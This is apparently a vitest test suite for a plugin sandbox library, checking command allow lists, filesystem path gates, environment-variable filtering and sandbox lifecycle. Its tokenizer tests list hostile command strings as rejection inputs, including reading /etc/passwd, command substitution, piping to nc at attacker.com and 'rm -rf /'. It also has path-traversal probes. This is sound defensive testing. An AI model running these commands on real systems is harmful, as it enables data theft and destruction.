/**
 * Sandbox behavioral suite: ProcessSandbox / InlineSandbox / WorkerSandbox,
 * the createSandbox factory, and selectSandboxType risk mapping. Replaces the
 * legacy source-grep "security fix validation" tests with real behavior.
 */

import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, afterAll, describe, expect, it, vi } from 'vitest'
import {
  InlineSandbox,
  ProcessSandbox,
  WorkerSandbox,
  createSandbox,
  selectSandboxType,
  type PluginSandboxConfig,
} from '../src/index.ts'
import { extractCommandBase } from '../src/sandbox/process-sandbox.ts'

const workRoot = mkdtempSync(join(tmpdir(), 'dsh-plugin-governance-'))
const workerEntry = fileURLToPath(new URL('./fixture/echo-worker.mjs', import.meta.url))

function baseConfig(overrides: Partial<PluginSandboxConfig> = {}): PluginSandboxConfig {
  return {
    type: 'process',
    resources: {
      memoryLimitMb: 512,
      cpuLimit: 80,
      timeoutMs: 60000,
      maxOutputBytes: 10485760,
    },
    filesystem: {
      access: 'readwrite',
      allowedPaths: [workRoot],
      deniedPatterns: [],
    },
    network: { access: 'none', allowedHosts: [], deniedHosts: [], allowLocal: false },
    environment: { whitelist: [], blacklist: [], clear: false },
    process: { spawn: true, exec: true, allowedCommands: ['node'], fullyAuthorized: false },
    ...overrides,
  }
}

afterEach(() => {
  vi.restoreAllMocks()
})

describe('extractCommandBase tokenizer', () => {
  // NOTE: '/' is not a shell metacharacter in the tokenizer's class, so
  // 'rm -rf /' tokenizes to 'rm' and is rejected later by the allow list.
  const dangerous = [
    'echo test; cat /etc/passwd',
    'echo test $(whoami)',
    'echo test `id`',
    'echo test | nc attacker.com',
    'echo test && rm -rf /',
    'echo test || echo pwned',
    'echo test > /etc/hosts',
  ]

  it('rejects shell metacharacters', () => {
    for (const cmd of dangerous) {
      expect(extractCommandBase(cmd)).toBeUndefined()
    }
  })

  it('tokenizes benign commands for the allow-list check', () => {
    expect(extractCommandBase('rm -rf /')).toBe('rm')
  })

  it('accepts safe commands and honors quotes', () => {
    expect(extractCommandBase('node --version')).toBe('node')
    expect(extractCommandBase('git status')).toBe('git')
    expect(extractCommandBase('"my tools" --x')).toBe('my tools')
    expect(extractCommandBase("'my tool' --x")).toBe('my tool')
    expect(extractCommandBase('   ')).toBeUndefined()
    expect(extractCommandBase('')).toBeUndefined()
  })
})

describe('ProcessSandbox.exec whitelist mode', () => {
  // NOTE: the sandbox splits commands on whitespace, so probe scripts must be
  // single-token JavaScript (no spaces inside the -e argument).
  it('runs an allow-listed command', async () => {
    const sandbox = new ProcessSandbox('p-ok', baseConfig(), 'entry.js')
    const result = await sandbox.exec('node -e console.log(40+2)')
    expect(result.exitCode).toBe(0)
    expect(result.stdout).toContain('42')
    expect(result.stderr).toBe('')
  })

  it('honors an explicit per-call timeout override', async () => {
    const sandbox = new ProcessSandbox('p-timeout-opt', baseConfig(), 'entry.js')
    const result = await sandbox.exec('node -e console.log(40+2)', { timeout: 30000 })
    expect(result.stdout).toContain('42')
  })

  it('rejects commands outside the allow list and dangerous tokens', async () => {
    const sandbox = new ProcessSandbox('p-deny', baseConfig(), 'entry.js')
    await expect(sandbox.exec('definitely-not-allowlisted --flag')).rejects.toThrow(/not allowed/)
    // Metacharacters make the base extraction fail before the allow check.
    await expect(sandbox.exec('node -e console.log(1) > out.txt')).rejects.toThrow(/not allowed/)
  })

  it('surfaces non-zero exits as rejections', async () => {
    const sandbox = new ProcessSandbox('p-exit', baseConfig(), 'entry.js')
    await expect(sandbox.exec('node -e process.exit(3)')).rejects.toThrow()
  })

  it('bypasses the allow list only when fullyAuthorized AND host grant are both set', async () => {
    const config = baseConfig({
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: true },
    })
    const sandbox = new ProcessSandbox('p-auth', config, 'entry.js', true)
    const result = await sandbox.exec('node -e console.log(7*6)')
    expect(result.stdout).toContain('42')
    await expect(sandbox.exec('   ')).rejects.toThrow()
    await expect(sandbox.exec('node -e process.exit(2)')).rejects.toThrow()
  })

  it('fails closed when fullyAuthorized is self-declared without a host grant', async () => {
    const config = baseConfig({
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: true },
    })
    // R-S43 前提 B：manifest 自声明 fullyAuthorized 不再自动授予权限；
    // 未获宿主授予时 fail-closed 落回命令白名单检查（空白名单 -> 拒绝）。
    const sandbox = new ProcessSandbox('p-auth-denied', config, 'entry.js')
    await expect(sandbox.exec('node -e console.log(1)')).rejects.toThrow(/not allowed/)
  })

  it('a host grant alone does not bypass the allow list', async () => {
    const config = baseConfig({
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: false },
    })
    const sandbox = new ProcessSandbox('p-grant-only', config, 'entry.js', true)
    await expect(sandbox.exec('node -e console.log(1)')).rejects.toThrow(/not allowed/)
  })

  it('passes cwd and env overrides through to the child', async () => {
    const sandbox = new ProcessSandbox('p-env', baseConfig(), 'entry.js')
    const result = await sandbox.exec('node -e console.log(process.env.PROBE_VAR)', {
      env: { PROBE_VAR: 'present' },
    })
    expect(result.stdout).toContain('present')

    const cwdResult = await sandbox.exec(
      'node -e console.log(process.cwd()===process.env.PROBE_CWD)',
      { cwd: tmpdir(), env: { PROBE_CWD: tmpdir() } },
    )
    expect(cwdResult.stdout).toContain('true')
  })
})

describe('ProcessSandbox filesystem gate', () => {
  it('writes, reads back, and lists inside the boundary', async () => {
    const sandbox = new ProcessSandbox('p-fs', baseConfig(), 'entry.js')
    const target = join(workRoot, 'probe.txt')
    await sandbox.write(target, 'payload')
    expect(readFileSync(target, 'utf-8')).toBe('payload')
    await expect(sandbox.read(target)).resolves.toBe('payload')
    await expect(sandbox.list(workRoot)).resolves.toContain('probe.txt')
  })

  it('denies paths outside the allow list', async () => {
    const sandbox = new ProcessSandbox('p-fs-deny', baseConfig(), 'entry.js')
    await expect(sandbox.read(join(tmpdir(), '..', 'definitely-outside.txt'))).rejects.toThrow(
      /Read access denied/,
    )
    await expect(sandbox.write(join(tmpdir(), 'outside-probe.txt'), 'x')).rejects.toThrow(
      /Write access denied/,
    )
    await expect(sandbox.list(join(tmpdir(), '..'))).rejects.toThrow(/List access denied/)
  })

  it('honors deniedPatterns over the allow list', async () => {
    const config = baseConfig({
      filesystem: {
        access: 'readwrite',
        allowedPaths: [workRoot],
        deniedPatterns: [join(workRoot, 'sealed')],
      },
    })
    const sandbox = new ProcessSandbox('p-denied-pattern', config, 'entry.js')
    expect(sandbox.isPathAllowed(join(workRoot, 'sealed', 'file.txt'))).toBe(false)
    // A deny pattern that does not match leaves the allow list in charge.
    expect(sandbox.isPathAllowed(join(workRoot, 'open', 'file.txt'))).toBe(true)
  })

  it('rejects traversal attempts that escape the boundary', async () => {
    const sandbox = new ProcessSandbox('p-traversal', baseConfig(), 'entry.js')
    expect(sandbox.isPathAllowed(join(workRoot, '..', '..', '..', 'etc', 'passwd'))).toBe(false)
  })

  it('enforces readonly access for writes', async () => {
    const config = baseConfig({
      filesystem: { access: 'readonly', allowedPaths: [workRoot], deniedPatterns: [] },
    })
    const sandbox = new ProcessSandbox('p-readonly', config, 'entry.js')
    await expect(sandbox.write(join(workRoot, 'nope.txt'), 'x')).rejects.toThrow(
      /Write access denied/,
    )
    const target = join(workRoot, 'probe-readonly.txt')
    writeFileSync(target, 'seeded')
    await expect(sandbox.read(target)).resolves.toBe('seeded')
  })

  it('returns false for paths when no allow list is configured', () => {
    const config = baseConfig({
      filesystem: { access: 'readwrite', allowedPaths: [], deniedPatterns: [] },
    })
    const sandbox = new ProcessSandbox('p-empty-allow', config, 'entry.js')
    expect(sandbox.isPathAllowed(workRoot)).toBe(false)
  })
})

describe('ProcessSandbox environment filtering', () => {
  const sensitiveEnv = {
    API_KEY: 'secret-key',
    SECRET_TOKEN: 'secret-token',
    PASSWORD: 'secret-password',
    AWS_SECRET_ACCESS_KEY: 'aws-secret',
    NORMAL_VAR: 'normal-value',
  }

  function withSensitiveEnv<T>(run: () => T): T {
    const original = process.env
    process.env = { ...original, ...sensitiveEnv }
    try {
      return run()
    } finally {
      process.env = original
    }
  }

  it('derives the default child env from runtime-required names only', () => {
    const sandbox = new ProcessSandbox('p-envfilter', baseConfig(), 'entry.js')
    withSensitiveEnv(() => {
      const filtered = sandbox.filterEnvironment()
      // 敏感变量与普通业务变量都不再进入沙箱子进程。
      expect(filtered['API_KEY']).toBeUndefined()
      expect(filtered['SECRET_TOKEN']).toBeUndefined()
      expect(filtered['PASSWORD']).toBeUndefined()
      expect(filtered['AWS_SECRET_ACCESS_KEY']).toBeUndefined()
      expect(filtered['NORMAL_VAR']).toBeUndefined()
      // 运行必需项保留，注入标记最后落位。
      expect(filtered['PATH']).toBeDefined()
      if (process.platform === 'win32') {
        // win32 宿主必然提供系统临时目录名（TEMP/TMP 均在 runtime-required 名单内）。
        expect(filtered['TEMP'] ?? filtered['TMP']).toBeDefined()
      } else {
        // 派生名单按名复制：宿主提供该名才有产物。posix 宿主通常不提供 TEMP/TMP
        // （win32 习惯名），但本断言并不假设其必然缺失——WSL 等环境可经 WSLENV
        // 把 win32 名透传进 posix 宿主——故这里只验证 posix 侧的 runtime-required
        // 宿主保证项 HOME（同 PATH 一样由运行环境必然提供）穿透派生。
        expect(filtered['HOME']).toBeDefined()
      }
      expect(filtered['NODE_ENV']).toBe('production')
      expect(filtered['DSH_SANDBOX']).toBe('true')
    })
  })

  it('keeps only whitelisted variables when a whitelist is configured', () => {
    const config = baseConfig({
      environment: { whitelist: ['NORMAL_VAR'], blacklist: [], clear: false },
    })
    const sandbox = new ProcessSandbox('p-whitelist', config, 'entry.js')
    withSensitiveEnv(() => {
      const filtered = sandbox.filterEnvironment()
      // 点名白名单可以从宿主提取额外变量。
      expect(filtered['NORMAL_VAR']).toBe('normal-value')
      expect(filtered['API_KEY']).toBeUndefined()
      // 运行必需项仍在默认集合里。
      expect(filtered['PATH']).toBeDefined()
    })
  })

  it('clears everything when configured to', () => {
    const config = baseConfig({
      environment: { whitelist: [], blacklist: [], clear: true },
    })
    const sandbox = new ProcessSandbox('p-clear', config, 'entry.js')
    withSensitiveEnv(() => {
      const filtered = sandbox.filterEnvironment()
      expect(Object.keys(filtered).sort()).toEqual(['DSH_SANDBOX', 'NODE_ENV'])
    })
  })

  it('drops explicitly blacklisted names even when they are runtime-required', () => {
    const config = baseConfig({
      environment: { whitelist: [], blacklist: ['PATH'], clear: false },
    })
    const sandbox = new ProcessSandbox('p-blacklist', config, 'entry.js')
    expect(sandbox.filterEnvironment()['PATH']).toBeUndefined()
  })

  it('passes DSH_HOME through so plugins resolve the install-scoped storage root', () => {
    const sandbox = new ProcessSandbox('p-dsh-home', baseConfig(), 'entry.js')
    withSensitiveEnv(() => {
      // Data-root discovery passthrough: DSH_HOME sits in the runtime-required
      // set (sandbox/env.ts REQUIRED_ENV_NAMES) and survives derivation.
      process.env.DSH_HOME = join(tmpdir(), 'f6-install', 'data')
      try {
        expect(sandbox.filterEnvironment()['DSH_HOME']).toBe(join(tmpdir(), 'f6-install', 'data'))
      } finally {
        delete process.env.DSH_HOME
      }
    })
  })

  it('still drops DSH_HOME when the config blacklist names it', () => {
    const config = baseConfig({
      environment: { whitelist: [], blacklist: ['DSH_HOME'], clear: false },
    })
    const sandbox = new ProcessSandbox('p-dsh-home-blacklist', config, 'entry.js')
    withSensitiveEnv(() => {
      process.env.DSH_HOME = join(tmpdir(), 'f6-install', 'data')
      try {
        // The blacklist always wins, even over a runtime-required name.
        expect(sandbox.filterEnvironment()['DSH_HOME']).toBeUndefined()
      } finally {
        delete process.env.DSH_HOME
      }
    })
  })

  it('does not leak caller-only environment variables into exec children', async () => {
    const sandbox = new ProcessSandbox('p-env-leak', baseConfig(), 'entry.js')
    await withSensitiveEnv(async () => {
      // JSON.stringify renders undefined entries as null; no shell
      // metacharacters appear in the probe so the allow list admits it.
      const result = await sandbox.exec(
        'node -e console.log(JSON.stringify([process.env.DSH_PROBE_SECRET,process.env.NORMAL_VAR]))',
        { env: { PROBE_VAR: 'present' } },
      )
      expect(result.stdout).toContain('[null,null]')
    })
  })

  it('merges per-call env overrides on top of the sanitized base', async () => {
    const sandbox = new ProcessSandbox('p-env-merge', baseConfig(), 'entry.js')
    const result = await sandbox.exec(
      'node -e console.log(process.env.PROBE_VAR+process.env.DSH_SANDBOX)',
      { env: { PROBE_VAR: 'present' } },
    )
    expect(result.stdout).toContain('presenttrue')
  })
})

describe('ProcessSandbox lifecycle', () => {
  it('start/stop manage a real child process', async () => {
    const entry = join(workRoot, 'long-entry.mjs')
    writeFileSync(entry, 'setInterval(() => {}, 1000)\n')
    const sandbox = new ProcessSandbox('p-lifecycle', baseConfig(), entry)

    await sandbox.start()
    expect(sandbox.isRunning()).toBe(true)
    expect(sandbox.getMemoryUsage()).toBe(0)

    await expect(sandbox.start()).rejects.toThrow(/already running/)

    await sandbox.stop()
    expect(sandbox.isRunning()).toBe(false)
  })

  it('stop without a running process is a no-op', async () => {
    const sandbox = new ProcessSandbox('p-stop-idle', baseConfig(), 'missing-entry.js')
    await expect(sandbox.stop()).resolves.toBeUndefined()
  })

  it('the resource watchdog kills the child once timeoutMs elapses', async () => {
    const entry = join(workRoot, 'watchdog-entry.mjs')
    writeFileSync(entry, 'setInterval(() => {}, 1000)\n')
    const config = baseConfig({ resources: { ...baseConfig().resources, timeoutMs: 50 } })
    const sandbox = new ProcessSandbox('p-watchdog', config, entry)

    // Fake timers must be active before start() arms the 5s monitor interval.
    vi.useFakeTimers()
    await sandbox.start()
    try {
      await vi.advanceTimersByTimeAsync(5001)
    } finally {
      vi.useRealTimers()
    }
    await vi.waitFor(() =>{  expect(sandbox.isRunning()).toBe(false) })
    expect(sandbox.getMemoryUsage()).toBe(0)
  }, 15000)

  it('monitor ticks inside the resource budget leave the child alone', async () => {
    const entry = join(workRoot, 'budget-entry.mjs')
    writeFileSync(entry, 'setInterval(() => {}, 1000)\n')
    const sandbox = new ProcessSandbox('p-budget', baseConfig(), entry)

    vi.useFakeTimers()
    await sandbox.start()
    try {
      await vi.advanceTimersByTimeAsync(5001)
      // One tick elapsed (5s) against a 60s budget: no kill, memory sampled.
      expect(sandbox.isRunning()).toBe(true)
      expect(sandbox.getMemoryUsage()).toBe(0)
    } finally {
      vi.useRealTimers()
    }
    await sandbox.stop()
  }, 15000)

  it('the monitor interval detaches itself once the child exits on its own', async () => {
    const entry = join(workRoot, 'short-entry.mjs')
    writeFileSync(entry, 'setTimeout(() => {}, 20)\n')
    const sandbox = new ProcessSandbox('p-short', baseConfig(), entry)

    // Fake timers must be active before start() arms the monitor interval so
    // the post-exit tick lands inside this test.
    vi.useFakeTimers()
    await sandbox.start()
    await vi.waitFor(() =>{  expect(sandbox.isRunning()).toBe(false) })
    try {
      await vi.advanceTimersByTimeAsync(5001)
    } finally {
      vi.useRealTimers()
    }
  }, 15000)
})

describe('InlineSandbox', () => {
  it('executes allow-listed commands without a shell', async () => {
    const sandbox = new InlineSandbox('i-ok', baseConfig())
    const result = await sandbox.exec('node -e console.log(6*7)')
    expect(result.stdout).toContain('42')
  })

  it('refuses exec entirely when process.exec is false', async () => {
    const config = baseConfig({
      process: { spawn: false, exec: false, allowedCommands: ['node'], fullyAuthorized: false },
    })
    const sandbox = new InlineSandbox('i-noexec', config)
    await expect(sandbox.exec('node -v')).rejects.toThrow(/exec\(\) is not allowed/)
  })

  it('rejects commands outside the allow list', async () => {
    const sandbox = new InlineSandbox('i-deny', baseConfig())
    await expect(sandbox.exec('definitely-not-allowlisted')).rejects.toThrow(/not in the allowed list/)
    // A blank command tokenizes to an empty executable.
    await expect(sandbox.exec('   ')).rejects.toThrow()
  })

  it('supports fullyAuthorized mode only when host grant is also set', async () => {
    const config = baseConfig({
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: true },
    })
    const sandbox = new InlineSandbox('i-auth', config, true)
    await expect(sandbox.exec('node -e console.log(5*5)')).resolves.toMatchObject({
      exitCode: 0,
    })
    await expect(sandbox.exec('node -e process.exit(1)')).rejects.toThrow()
  })

  it('fails closed when fullyAuthorized is self-declared without a host grant', async () => {
    const config = baseConfig({
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: true },
    })
    const sandbox = new InlineSandbox('i-auth-denied', config)
    await expect(sandbox.exec('node -e console.log(1)')).rejects.toThrow(/not in the allowed list/)
  })

  it('a host grant alone does not bypass the inline allow list', async () => {
    const config = baseConfig({
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: false },
    })
    const sandbox = new InlineSandbox('i-grant-only', config, true)
    await expect(sandbox.exec('node -e console.log(1)')).rejects.toThrow(/not in the allowed list/)
  })

  it('routes cwd/env overrides in fullyAuthorized mode and rejects blank commands', async () => {
    const config = baseConfig({
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: true },
    })
    const sandbox = new InlineSandbox('i-auth-env', config, true)
    const result = await sandbox.exec('node -e console.log(process.env.PROBE_VAR)', {
      env: { PROBE_VAR: 'inline-present' },
      cwd: tmpdir(),
      timeout: 30000,
    })
    expect(result.stdout).toContain('inline-present')

    // A blank command tokenizes to an empty executable and must fail loudly.
    await expect(sandbox.exec('   ')).rejects.toThrow()
  })

  it('honors an explicit per-call timeout override', async () => {
    const sandbox = new InlineSandbox('i-timeout-opt', baseConfig())
    await expect(
      sandbox.exec('node -e console.log(3*3)', { timeout: 30000 }),
    ).resolves.toMatchObject({ exitCode: 0 })
  })

  it('surfaces non-zero exits as rejections', async () => {
    const sandbox = new InlineSandbox('i-exit', baseConfig())
    await expect(sandbox.exec('node -e process.exit(4)')).rejects.toThrow()
  })

  it('gates reads/writes/lists by path and access mode', async () => {
    const sandbox = new InlineSandbox('i-fs', baseConfig())
    const target = join(workRoot, 'inline.txt')
    await sandbox.write(target, 'inline-payload')
    expect(readFileSync(target, 'utf-8')).toBe('inline-payload')
    await expect(sandbox.read(target)).resolves.toBe('inline-payload')
    await expect(sandbox.list(workRoot)).resolves.toContain('inline.txt')

    // readwrite access still refuses paths outside the boundary.
    await expect(sandbox.write(join(tmpdir(), 'outside-inline.txt'), 'x')).rejects.toThrow(
      /Write access denied/,
    )
    await expect(sandbox.read(join(tmpdir(), 'outside-inline.txt'))).rejects.toThrow(
      /Read access denied/,
    )
    await expect(sandbox.list(join(tmpdir(), '..'))).rejects.toThrow(/List access denied/)
  })

  it('honors deniedPatterns over the allow list and tilde escapes', () => {
    const config = baseConfig({
      filesystem: {
        access: 'readwrite',
        allowedPaths: [workRoot],
        deniedPatterns: [join(workRoot, 'sealed')],
      },
    })
    const sandbox = new InlineSandbox('i-denied', config)
    expect(sandbox.isPathAllowed(join(workRoot, 'sealed', 'file.txt'))).toBe(false)
    expect(sandbox.isPathAllowed(join(workRoot, 'open', 'file.txt'))).toBe(true)
    // A literal ~ never survives resolve(); the guard rejects it defensively.
    expect(sandbox.isPathAllowed('~/secrets')).toBe(false)
  })

  it('treats an empty allow list as fail-closed (shared PathGuard semantics)', () => {
    const config = baseConfig({
      filesystem: { access: 'readwrite', allowedPaths: [], deniedPatterns: [] },
    })
    const sandbox = new InlineSandbox('i-open', config)
    // 与 ProcessSandbox 一致：空白名单拒绝一切，不再放行任意路径。
    expect(sandbox.isPathAllowed(join(tmpdir(), 'anything.txt'))).toBe(false)
    expect(sandbox.isPathAllowed(workRoot)).toBe(false)
  })

  it('routes normal-mode exec through the sanitized env and cwd overrides', async () => {
    const sandbox = new InlineSandbox('i-normal-env', baseConfig())
    const result = await sandbox.exec('node -e console.log(`${process.env.PROBE_VAR}:${process.env.NORMAL_VAR===undefined}`)', {
      env: { PROBE_VAR: 'inline-present' },
      cwd: tmpdir(),
    })
    // 覆盖项生效；宿主全量 env（如 NORMAL_VAR）不进入子进程。
    expect(result.stdout).toContain('inline-present:true')
  })

  it('enforces readonly access for inline writes', async () => {
    const config = baseConfig({
      filesystem: { access: 'readonly', allowedPaths: [workRoot], deniedPatterns: [] },
    })
    const sandbox = new InlineSandbox('i-readonly', config)
    await expect(sandbox.write(join(workRoot, 'nope-inline.txt'), 'x')).rejects.toThrow(
      /Write access denied/,
    )
  })
})

describe('WorkerSandbox', () => {
  const workerConfig = () =>
    baseConfig({ resources: { ...baseConfig().resources, timeoutMs: 2000 }, type: 'worker' })

  it('refuses exec by design', async () => {
    const sandbox = new WorkerSandbox('w-exec', workerConfig(), workerEntry)
    await expect(sandbox.exec('node -v')).rejects.toThrow(/not available in Worker sandbox/)
  })

  it('rejects IO before start', async () => {
    const sandbox = new WorkerSandbox('w-cold', workerConfig(), workerEntry)
    await expect(sandbox.read('/x')).rejects.toThrow(/is not running/)
    await expect(sandbox.list('/x')).rejects.toThrow(/is not running/)
    await expect(sandbox.write('/x', 'y')).rejects.toThrow(/is not running/)
    expect(sandbox.isRunning()).toBe(false)
    await expect(sandbox.stop()).resolves.toBeUndefined()
  })

  it('round-trips read/list/write through the worker port', async () => {
    const sandbox = new WorkerSandbox('w-io', workerConfig(), workerEntry)
    await sandbox.start()
    expect(sandbox.isRunning()).toBe(true)
    await expect(sandbox.start()).rejects.toThrow(/already running/)

    await expect(sandbox.read('/data/probe')).resolves.toBe('request:/data/probe')
    await expect(sandbox.list('/data')).resolves.toBe('request:/data')
    await expect(sandbox.write('/data/probe', 'content')).resolves.toBeUndefined()

    await sandbox.stop()
    expect(sandbox.isRunning()).toBe(false)
  })

  it('propagates worker-reported errors', async () => {
    const sandbox = new WorkerSandbox('w-error', workerConfig(), workerEntry)
    await sandbox.start()
    await expect(sandbox.read('sandbox-error')).rejects.toThrow('injected failure')
    await sandbox.stop()
  })

  it('swallows malformed and orphaned worker messages until the timeout', async () => {
    const impatient = baseConfig({
      type: 'worker',
      resources: { ...baseConfig().resources, timeoutMs: 80 },
    })
    const sandbox = new WorkerSandbox('w-junk', impatient, workerEntry)
    await sandbox.start()
    // A bare string payload is not a response envelope.
    await expect(sandbox.read('sandbox-junk')).rejects.toThrow('IPC timeout')
    // An object without the response type is ignored as well.
    await expect(sandbox.read('sandbox-not-a-response')).rejects.toThrow('IPC timeout')
    // A well-formed response for an unknown id resolves nothing.
    await expect(sandbox.read('sandbox-unknown-id')).rejects.toThrow('IPC timeout')
    await sandbox.stop()
  })

  it('times out requests the worker never answers', async () => {
    const impatient = baseConfig({
      type: 'worker',
      resources: { ...baseConfig().resources, timeoutMs: 80 },
    })
    const sandbox = new WorkerSandbox('w-timeout', impatient, workerEntry)
    await sandbox.start()
    await expect(sandbox.read('sandbox-silence')).rejects.toThrow('IPC timeout')
    await sandbox.stop()
  })

  it('rejects pending requests when the worker exits', async () => {
    const sandbox = new WorkerSandbox('w-exit', workerConfig(), workerEntry)
    await sandbox.start()
    const pending = sandbox.read('sandbox-silence')
    await sandbox.stop()
    await expect(pending).rejects.toThrow(/Worker exited with code/)
  }, 15000)
})

describe('createSandbox factory', () => {
  it('builds each sandbox kind from config', () => {
    expect(createSandbox('f-inline', baseConfig({ type: 'inline' }))).toBeInstanceOf(InlineSandbox)
    expect(createSandbox('f-process', baseConfig({ type: 'process' }), 'entry.js')).toBeInstanceOf(
      ProcessSandbox,
    )
    expect(createSandbox('f-worker', baseConfig({ type: 'worker' }), 'entry.mjs')).toBeInstanceOf(
      WorkerSandbox,
    )
  })

  it('passes hostGrantedFull through to process and inline sandboxes', async () => {
    const procCfg = baseConfig({
      type: 'process',
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: true },
    })
    // Host grant via the factory: the fullyAuthorized bypass actually works.
    const procSandbox = createSandbox('f-host-grant', procCfg, 'entry.js', true)
    const procResult = await procSandbox.exec('node -e console.log(40+2)')
    expect(procResult.exitCode).toBe(0)
    expect(procResult.stdout).toContain('42')

    // No host grant: self-declared fullyAuthorized must NOT bypass the (empty)
    // allow list through the factory — the default is fail-closed.
    const inlineCfg = baseConfig({
      type: 'inline',
      process: { spawn: true, exec: true, allowedCommands: [], fullyAuthorized: true },
    })
    const inlineSandbox = createSandbox('f-host-grant-i', inlineCfg)
    await expect(inlineSandbox.exec('node -e console.log(1)')).rejects.toThrow(
      /not in the allowed list/,
    )
  })

  it('demands an entryPoint for process and worker kinds', () => {
    expect(() => createSandbox('f-p', baseConfig({ type: 'process' }))).toThrow(
      /entryPoint is required for process sandbox/,
    )
    expect(() => createSandbox('f-w', baseConfig({ type: 'worker' }))).toThrow(
      /entryPoint is required for worker sandbox/,
    )
  })

  it('rejects unknown sandbox types', () => {
    // 'untrusted' 已从 SandboxType 移除（R-S43 消歧）；旧清单若仍携带该值，
    // 工厂必须 fail-closed 抛错而非落入不明确态。经字符串转义注入以模拟
    // 未经类型系统校验的磁盘 JSON。
    const legacy = baseConfig({ type: 'process' })
    ;(legacy as { type: string }).type = 'untrusted'
    expect(() => createSandbox('f-u', legacy, 'entry.js')).toThrow(/Unknown sandbox type/)
  })
})

describe('selectSandboxType risk mapping', () => {
  it('escalates process-capable or networked plugins to process isolation', () => {
    expect(selectSandboxType(baseConfig({ type: 'inline' })).type).toBe('process')
    expect(
      selectSandboxType(
        baseConfig({ type: 'inline', process: { spawn: false, exec: true, allowedCommands: [] } }),
      ).type,
    ).toBe('process')
    expect(
      selectSandboxType(baseConfig({ type: 'inline', network: { access: 'external', allowedHosts: [], deniedHosts: [], allowLocal: true } })).type,
    ).toBe('process')
  })

  it('maps readwrite filesystem to worker isolation', () => {
    expect(
      selectSandboxType(
        baseConfig({ type: 'inline', process: { spawn: false, exec: false, allowedCommands: [] } }),
      ).type,
    ).toBe('worker')
  })

  it('keeps low-risk plugins inline', () => {
    expect(
      selectSandboxType(
        baseConfig({
          type: 'inline',
          process: { spawn: false, exec: false, allowedCommands: [] },
          filesystem: { access: 'readonly', allowedPaths: [], deniedPatterns: [] },
        }),
      ).type,
    ).toBe('inline')
  })
})

// Shared temp root cleanup happens per-run; keep the tree tidy.
afterAll(() => {
  rmSync(workRoot, { recursive: true, force: true })
})
